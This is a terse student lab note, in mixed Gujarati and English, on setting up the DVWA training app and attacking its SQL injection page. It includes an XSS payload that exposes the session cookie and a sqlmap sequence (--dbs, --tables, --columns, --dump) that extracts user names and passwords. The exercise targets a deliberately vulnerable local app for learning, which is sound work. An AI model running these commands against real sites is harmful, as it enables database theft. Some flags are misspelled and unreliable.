@@ -1,0 +1,32 @@
+practicle :  9
+
+
+DVWA/sql
+
+
+dounload DVWA-master
+DVWS-master ne c: xampp/htdoc ma mukvanu
+start xampp 
+new tab localhost/DVWA-master
+xampp/php/php type(cong)
+ctr+f
+on 
+gd(remove ;)
+xampp/htdocx/dvws/config folder/config file   -> recaptcha ma     unm :abc   pass:xyz
+create database
+admin,password
+
+192.168.200.108(main pc nu ip)/DVWA-master/
+admin
+password
+security -> low 
+sql injection  ->user id :1
+url copy 
+kali trminal ma -> sqlmap -u  "url paste" --cookie="(go to kali DVWA ma  xss(reflection) =<script>alert(""+document.cookie);</script> link  ave e copy )link paste ama security low agal thi nikali;  pachhad lagavan " --dbs
+upar vali line ma dbs kadhi -D dvws --tables
+(table avi jase)
+upar vali line ma -D dvws -T users -cloumns
+(cloumns avse)
+upar ni line ma -D dvws -T users -c user,password --dump
+
+
